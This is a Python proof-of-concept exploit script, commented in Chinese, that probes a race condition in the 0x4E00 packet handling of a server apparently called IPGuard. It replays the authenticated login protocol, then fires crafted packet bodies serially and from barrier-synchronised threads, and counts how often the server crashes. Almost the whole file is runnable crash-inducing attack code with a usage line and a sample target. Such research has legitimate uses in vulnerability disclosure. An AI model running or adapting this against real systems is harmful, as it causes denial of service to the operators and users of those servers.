"""poc_4E00_race.py — 测 0x4E00 是否含竞争条件

实验:
  R1 — 串行 N 次 vs 并发 N 次,看崩溃率差异
  R2 — 多线程混合包(empty + \\x01),看是否触发原本不崩的 body
  R3 — 高速短间隔发包看 worker pool 是否被 starve

用法:
  python poc_4E00_race.py 192.168.2.130 8236 Admin admin123456
"""
import os, socket, struct, sys, time, threading, queue

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)


def fresh_send(host, port, user, pwd, cmd, sub, body, flags=0x4E00, timeout=15.0):
    """返回 (response_or_None, crashed:bool)"""
    try:
        base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        idx, lr, st, _ = replay_login(s, user, pwd, base_nonce,
                                       show_crypto=False, verbose=False)
        next_nonce = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=cmd, a3=sub, nonce=next_nonce,
            sess_state_16_24=struct.pack("<II", lr, st),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body,
        )
        s.sendall(pkt)
        try:
            r = parse_packet(recv_full_packet(s))
            return r, False
        except (socket.timeout, ConnectionError, OSError):
            return None, True
    except Exception as e:
        return {"_err": str(e)}, False
    finally:
        try: s.close()
        except: pass


def check_alive(host, port, timeout=3.0):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except: return False


def wait_for_guard(host, port, max_wait=15.0):
    for _ in range(int(max_wait / 0.5)):
        time.sleep(0.5)
        if check_alive(host, port): return True
    return False


# ============ Experiment R1: 串行 vs 并发 ============
def exp_serial(host, port, user, pwd, body, n=10, label=""):
    crashes = 0
    for i in range(n):
        if not check_alive(host, port):
            wait_for_guard(host, port)
        _, crashed = fresh_send(host, port, user, pwd, 0x4014, 6, body)
        if crashed:
            crashes += 1
            wait_for_guard(host, port)
    print(f"  serial {label} body={body.hex() or '<empty>'} → {crashes}/{n} crashed")
    return crashes


def exp_concurrent(host, port, user, pwd, body, n=10, label=""):
    """同时启动 n 个线程发同一个包"""
    if not check_alive(host, port): wait_for_guard(host, port)
    barrier = threading.Barrier(n)
    results = queue.Queue()

    def worker():
        barrier.wait()  # 所有线程到位再一起开火
        _, crashed = fresh_send(host, port, user, pwd, 0x4014, 6, body)
        results.put(crashed)

    threads = [threading.Thread(target=worker) for _ in range(n)]
    for t in threads: t.start()
    for t in threads: t.join()

    crashes = sum(1 for _ in range(results.qsize()) if results.get())
    print(f"  concur {label} body={body.hex() or '<empty>'} → {crashes}/{n} threads got RST")
    if not check_alive(host, port):
        wait_for_guard(host, port)
    return crashes


# ============ Experiment R2: 混合包 ============
def exp_mixed(host, port, user, pwd, n=20):
    """一半线程发 empty,一半发非崩 body (sub6 18B),看看是否相互影响"""
    if not check_alive(host, port): wait_for_guard(host, port)
    barrier = threading.Barrier(n)
    results = []

    def worker_a():
        barrier.wait()
        _, crashed = fresh_send(host, port, user, pwd, 0x4014, 6, b"")
        results.append(("empty", crashed))

    def worker_b():
        barrier.wait()
        # body_sub6 18B 'X' from v5
        wcs = "X".encode("utf-16-le") + b"\x00\x00"
        body = struct.pack("<II", 1, 1) + wcs
        _, crashed = fresh_send(host, port, user, pwd, 0x4014, 6, body)
        results.append(("18B-X", crashed))

    threads = []
    for i in range(n):
        threads.append(threading.Thread(target=worker_a if i % 2 == 0 else worker_b))
    for t in threads: t.start()
    for t in threads: t.join()

    by_type = {}
    for lab, c in results:
        by_type.setdefault(lab, [0, 0])
        by_type[lab][0] += 1
        by_type[lab][1] += int(c)
    for lab, (total, crashes) in by_type.items():
        print(f"  mixed: {lab:8s} → {crashes}/{total} crashed")
    if not check_alive(host, port): wait_for_guard(host, port)


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]

    print(f"[*] {host}:{port}\n")
    if not check_alive(host, port):
        print("server not alive, abort"); return

    print("=" * 70)
    print("R1: Serial vs Concurrent (是否竞争窗口扩大命中)")
    print("=" * 70)
    # 串行: empty 不崩 — 应该 0/10
    exp_serial(host, port, user, pwd, b"", n=10, label="empty")
    time.sleep(2)
    # 并发: 如果是竞争,empty 也可能崩
    exp_concurrent(host, port, user, pwd, b"", n=10, label="empty")
    time.sleep(3)

    # 串行: \x01 必崩
    exp_serial(host, port, user, pwd, b"\x01\x00\x00\x00", n=5, label="x01")
    time.sleep(2)
    # 并发: \x01
    exp_concurrent(host, port, user, pwd, b"\x01\x00\x00\x00", n=5, label="x01")
    time.sleep(3)

    # 18B 'X' — 之前不崩(干净) vs 污染后崩
    wcs = "X".encode("utf-16-le") + b"\x00\x00"
    body18 = struct.pack("<II", 1, 1) + wcs
    exp_serial(host, port, user, pwd, body18, n=5, label="18B-X")
    time.sleep(2)
    exp_concurrent(host, port, user, pwd, body18, n=5, label="18B-X")
    time.sleep(3)

    print()
    print("=" * 70)
    print("R2: 混合包(empty + 18B-X 各 10 个)同时发,看竞争窗口")
    print("=" * 70)
    exp_mixed(host, port, user, pwd, n=20)


if __name__ == "__main__":
    main()
